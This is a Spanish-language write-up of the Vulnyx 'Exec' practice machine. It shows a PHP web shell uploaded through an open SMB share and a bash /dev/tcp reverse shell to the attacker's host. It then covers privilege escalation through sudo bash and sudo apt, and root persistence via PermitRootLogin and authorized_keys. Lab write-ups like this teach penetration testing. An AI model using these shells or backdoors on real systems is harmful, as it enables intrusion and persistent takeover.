---
title: Vulnyx - Exec
author: estx
date: 2024-04-25 17:51:00 +0800
categories: [Writeup, Vulnyx, Low]
tags: [Linux, 'SMB', 'File Upload' , 'binary abusing']
math: true
mermaid: true
image:
  path: /assets/images/Vulnyx/Low/Exec/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Plex Machine Logo
---

Máquina Linux de nivel **Low** de Vulnyx.

Técnicas usadas: **File Upload, Binary Abusing**

### Fase de Reconocimiento 🧣

Como primer punto, identificamos la dirección IP de la **`Máquina Vulnyx`**

```bash
root@kali> arp-scan -I eth0 --local --ignoredups

<SNIP>
192.168.100.63	08:00:27:c6:4f:1d	PCS Systemtechnik GmbH
```
> Con esto identificamos todos los dispositivos en nuestra red local.

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n 192.168.100.63 -oG puertos`**

  ![](/assets/images/Vulnyx/Low/Exec/01-ports.png)

b. Vemos la versiones de los servicios que se están ejecutando

* **`nmap -p22,80,139,445 -sCV <IP> -oN versiones`**

  ![](/assets/images/Vulnyx/Low/Exec/02-versions.png)


c. En el **puerto 80** no hay algo interesante (Solo la página por defecto), por lo que, investigamos todo sobre el servicio **SMB** (Puerto 445)

```bash
# Primero listamos los directorios disponibles
❯ smbclient -L \\192.168.100.63

Password for [WORKGROUP\root]: <ENTER>

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        server          Disk      Developer Directory
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
        nobody          Disk      Home Directories


# Vemos que el directorio "server" puede ser accedido, por lo que, nos conectamos y listamos los recursos disponibles

❯ smbclient \\\\192.168.100.63\\server

Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 25 17:20:01 2024
  ..                                  D        0  Mon Apr 15 10:04:12 2024
  index.html                          N    10701  Mon Apr 15 10:04:31 2024
```

* Si nos decargamos el archivo **index.html** con el comando `get index.html` nos daremos cuenta que es el archivo por defecto del puerto 80. Intuimos entonces que probablemente los archivos de este directorio se ven reflejados en el servicio HTTP. Intentaremos subir un archivo `.php` para ejecutar comandos.

```bash
❯ cat secret.php

<?php
	system($_GET['cmd']);
?>
```

> La función `system` nos permite ejecutar comandos en el sistema. Con **`$_GET['cmd']`** lo que hacemos es indicar que el comando que se va a ejecutar lo indicaremos desde la **URL**. **Ej.** http://192.168.100.63/secret.php?cmd=<COMANDO>
{: .prompt-info }

* Por último, subimos el archivo **secret.php** al servicio SMB con **`put secret.php`**

d. Ahora con **cURL** podemos ejecutar comando en la máquina víctima

```bash
❯ curl -s -X GET "http://192.168.100.63/secret.php?cmd=hostname"
exec
```

* Ahora nos entablamos un reverse shell 👨‍💻

```bash
❯ cat index.html

#!/bin/bash

bash -i >& /dev/tcp/192.168.100.55/4444 0>&1
---------------------------------------------

❯ python -m http.server 80

---------------------------------------------

❯ nc -lvnp 4444
```
> Con esto lo que hacemos es servir el archivo `index.html`, para que al ser requerido por la máquina víctima se ejecute el código **.sh**

* Hacemos que la máquina víctima solicite el archivo

![](/assets/images/Vulnyx/Low/Exec/03-exploit.png)

![](/assets/images/Vulnyx/Low/Exec/04-reverse.png)



### Escalada de Privilegios 💹

1. Hacemos el tratamiento de la TTY para trabajar de manera más cómoda con la reverse shell

```bash
www-data@exec:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@exec:/var/www/html$ ^Z
[1]  + 25443 suspended  nc -lvnp 4444
❯ stty raw -echo;fg
[1]  + 25443 continued  nc -lvnp 4444
                                     reset xterm


www-data@exec:/var/www/html$ export TERM=xterm-256color
www-data@exec:/var/www/html$ source /etc/skel/.bashrc 
www-data@exec:/var/www/html$
```


2. Miramos los permisos a nivel de sudoers de este usuario

```bash
www-data@exec:/var/www/html$ sudo -l

User www-data may run the following commands on exec:
    (s3cur4) NOPASSWD: /usr/bin/bash
```

* Vemos que podemos ejecutar una **bash** como el usuario `s3cur4`

```bash
www-data@exec:/var/www/html$ sudo -u s3cur4 /usr/bin/bash
s3cur4@exec:/var/www/html$ whoami
s3cur4
```

3. Ahora vemos los permisos del usuario `s3cur4`

```bash
s3cur4@exec:/var/www/html$ sudo -l

User s3cur4 may run the following commands on exec:
    (root) NOPASSWD: /usr/bin/apt
```

* Vemos en [GTFOBins](https://gtfobins.github.io/gtfobins/apt/#shell) una forma de escalar privilegio ejecutando **apt**

```bash
s3cur4@exec:/var/www/html$ sudo -u root /usr/bin/apt changelog apt
Get:1 https://metadata.ftp-master.debian.org apt 2.6.1 Changelog [505 kB]
Fetched 505 kB in 2s (241 kB/s)
# Después de ejecutar el comando, se abrirá una pantalla en la cual debemos escribir !/bin/bash
root@exec:/var/www/html# 
```


### Extras 🌟

1. Podemos autenticarnos mediante **SSH** directamente a la máquina víctima:

* Primero, habilitamos el permiso para que **root** pueda autenticarse a través de SSH. Quitamos el **#** y colocamos un **yes**

```bash
root@exec:~# cat /etc/ssh/sshd_config

...
PermitRootLogin yes
...
```

* Ahora, generamos un par de claves RSA en nuestra máquina host

```bash
❯ ssh-keygen

# Asignamos el permiso 600 a la clave id_rsa privada
❯ chmod 600 id_rsa
```

* Copiamos el contenido de la clave id_rsa pública y lo ponemos en un archivo **authorized_keys** en el directorio /root/.ssh

```bash
root@exec:~/.ssh# echo -n 'ssh-ed25519 ... root@kali' > authorized_keys
```


* Finalmente, nos podemos autenticar directamente por ssh como el usuario **root**

```bash
❯ ssh root@192.168.100.63 -i id_rsa
root@exec:~#
```